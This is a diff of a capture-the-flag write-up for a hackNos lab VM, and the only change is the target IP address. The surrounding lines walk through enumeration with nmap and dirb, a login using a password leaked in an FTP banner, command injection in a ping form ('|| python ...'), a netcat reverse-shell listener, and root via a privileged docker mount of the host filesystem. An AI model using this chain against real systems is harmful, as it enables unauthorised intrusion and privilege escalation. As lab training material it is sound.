@@ -13,9 +13,9 @@
 ## Enumeration
 - VM IP: `sudo netdiscover`
 
-	* `VMWare 192.168.0.12 `
+	* `VMWare 192.168.0.14 `
 	
-- VM info: `nmap -A -T4 -v 192.168.0.12`
+- VM info: `nmap -A -T4 -v 192.168.0.14`
 	
 	* <pre>
 	  21/tcp open  ftp     vsftpd 2.0.8 or later
@@ -25,29 +25,29 @@
 	* FTP **Anonymous** log-in is on. 
 		* FTP Server Banner: "ftp 'Security@hackNos'"
 	  
-- Web Server Directory: `dirb -w http://192.168.0.12` 
+- Web Server Directory: `dirb -w http://192.168.0.14` 
 
 	* <pre>
-	  http://192.168.0.12/index.html
-	  http://192.168.0.12/css/style.css
-	  http://192.168.0.12/css/2.jpg
+	  http://192.168.0.14/index.html
+	  http://192.168.0.14/css/style.css
+	  http://192.168.0.14/css/2.jpg
 	  </pre>
 	  
-- Web Server 192.168.0.12/5ecure login using:
+- Web Server 192.168.0.14/5ecure login using:
 
 	* admin:Security@hackNos, FTP Server Banner
 
-- Web Server Directory: `dirb -w http://192.168.0.12/5ecure`		
+- Web Server Directory: `dirb -w http://192.168.0.14/5ecure`		
 	* <pre>
-	  http://192.168.0.12/5ecure/index.html, form that POSTs data to output.php
-	  http://192.168.0.12/5ecure/css/style.css
-	  http://192.168.0.12/5ecure/css/2.jpg
-	  http://192.168.0.12/5ecure/output.php, simple ping <ip> function + stdout
+	  http://192.168.0.14/5ecure/index.html, form that POSTs data to output.php
+	  http://192.168.0.14/5ecure/css/style.css
+	  http://192.168.0.14/5ecure/css/2.jpg
+	  http://192.168.0.14/5ecure/output.php, simple ping <ip> function + stdout
 	  </pre>
 ---
 	
 ## Penetration
-- 192.168.0.12/5ecure/out.php
+- 192.168.0.14/5ecure/out.php
 
 	* `exec(ping $ip)`, possible shell injection 
 	
@@ -68,7 +68,7 @@
 
 ## Escelation
 
-- `ssh 192.168.0.12 -l recon`
+- `ssh 192.168.0.14 -l recon`
 	* pass: Security@hackNos
 - `docker run -it --privileged --name=ctf -v /:/host:rw alpine sh`
 - container: `cd /host`
@@ -84,7 +84,7 @@
 		- Gateway: 192.168.0.1
 		- connect to the network using the new interface
 - `nc -lvp 4444` to initiate a listener on 4444
-- on 192.168.0.12/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
+- on 192.168.0.14/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
 - tty: `python -c 'import pty; pty.spawn("/bin/bash")'`
 - `getent group`: 
 	* `docker:x:119:`, passwd --> `recon:x:1000:119:rahul:/home/recon:/bin/bash`
